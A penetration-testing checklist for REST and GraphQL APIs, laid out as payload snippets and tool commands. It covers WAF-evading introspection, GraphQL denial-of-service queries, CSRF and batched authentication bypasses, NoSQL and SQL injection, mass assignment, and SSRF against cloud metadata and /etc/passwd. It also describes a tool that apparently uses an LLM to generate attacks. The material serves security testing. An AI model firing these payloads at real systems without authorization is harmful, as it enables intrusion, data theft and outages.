# In-Depth REST + GraphQL Testing

## Complete GraphQL Security Test Checklist

### Introspection Probing (three-level downgrade)

```graphql
# Level 1 — standard introspection
{ __schema { queryType { name } mutationType { name } types { name fields { name type { name } } } } }

# Level 2 — slimmed-down introspection (bypasses WAF)
{ __schema { types { name } } }

# Level 3 — minimal probe
{ __type(name: "Query") { name } }
```

### DoS Attack Vectors

```graphql
# Alias overload
query { a1: __typename a2: __typename ... a100: __typename }

# Batched-query overload
[query1, query2, ..., query10]

# Cyclic queries
query { __schema { types { fields { type { fields { type { fields { name } } } } } } } }

# Directive overload
query { __typename @skip(if: false) @include(if: true) ... }
```

### Authorization Testing

```graphql
# Mutation over GET (CSRF)
GET /graphql?query=mutation+{+deleteUser(id:1)+}

# Batched-query authentication bypass
[
  { "query": "query { me { id } }" },
  { "query": "mutation { deleteUser(id: 2) }" }
]
```

## In-Depth REST API Testing

### Method-Manipulation Matrix

| Endpoint | GET | POST | PUT | PATCH | DELETE | OPTIONS |
|----------|-----|------|-----|-------|--------|---------|
| /users | ✓ accessible | test unauthorized create | test bulk overwrite | test field injection | test cascading delete | information leak |
| /users/me | baseline | — | test self-privilege-escalation | test field appending | test self-delete | — |

### Parameter Injection

```json
// NoSQL injection
{"username": {"$gt": ""}, "password": {"$ne": ""}}

// Mass assignment
{"email": "user@example.com", "role": "admin", "isAdmin": true}

// Parameter pollution
GET /api/users?role=user&role=admin

// JSON array injection
{"ids": [1, 2, 3]} → {"ids": ["1 UNION SELECT ..."]}
```

### SSRF via API

```
Common SSRF parameters: webhook_url, callback_url, avatar_url, import_url,
                        redirect_uri, file_url, proxy_url, image_url
Test with: http://169.254.169.254/latest/meta-data/ (AWS)
           http://metadata.google.internal/ (GCP)
           file:///etc/passwd
```

## Automated Toolchain

### Vespasian (traffic-driven spec generation)

```bash
# Crawl from a headless browser
vespasian crawl --url https://target.com --depth 3

# Import from Burp/HAR
vespasian import --file traffic.har

# Export OpenAPI 3.0 + GraphQL SDL
vespasian export --format openapi3 --output api-spec.yaml
```

### Entropy (LLM attack generation)

```bash
# Spec-based automated testing
entropy --spec api-spec.yaml --live --persona all

# Five concurrent personas:
# - malicious_insider: IDOR/mass assignment/privilege escalation
# - bot_swarm: rate-limit bypass/DoS/automation abuse
# - penetration_tester: injection/auth bypass
# - impatient_consumer: race conditions/error handling
# - confused_user: unexpected input/boundary testing

# CI mode
entropy --spec api-spec.yaml --ci --watch
```

### api.sh (8-phase pipeline)

```bash
# Phases 1-3: GraphQL recon → exploit → brute force
./api.sh graphql-recon https://target.com/graphql
./api.sh graphql-exploit https://target.com/graphql

# Phase 4: REST abuse
./api.sh rest-abuse https://target.com/api

# Phase 5: WebSocket
./api.sh ws-test wss://target.com/ws

# Phase 6: SOAP/XXE
./api.sh soap-xxe https://target.com/soap

# Phase 7: rate-limit bypass
./api.sh rate-bypass https://target.com/api

# Phase 8: schema harvesting
./api.sh schema-harvest https://target.com
```

Source: OWASP API Top 10, Praetorian Vespasian, Entropy, FireTail GraphQL
